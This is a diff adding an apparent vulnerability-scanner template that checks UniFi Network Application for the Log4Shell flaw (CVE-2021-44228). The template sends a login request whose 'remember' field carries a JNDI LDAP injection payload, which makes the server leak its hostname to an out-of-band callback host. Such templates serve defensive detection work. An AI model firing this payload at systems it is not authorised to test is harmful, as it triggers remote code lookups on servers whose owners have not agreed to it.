@@ -1,0 +1,33 @@
+id: unifi-network-log4j-rce
+brief:
+    title: UniFi Network Application - Remote Code Execution (Apache Log4j)
+    by: KrE80r
+    level: critical
+    about: UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - log4j
+        - ubnt
+        - unifi
+        - oast
+        - jndi
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/login'
+      head:
+        Content-Type: application/json; charset=utf-8
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/manage/account/login?redirect=%2Fmanage'
+      body: '{"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
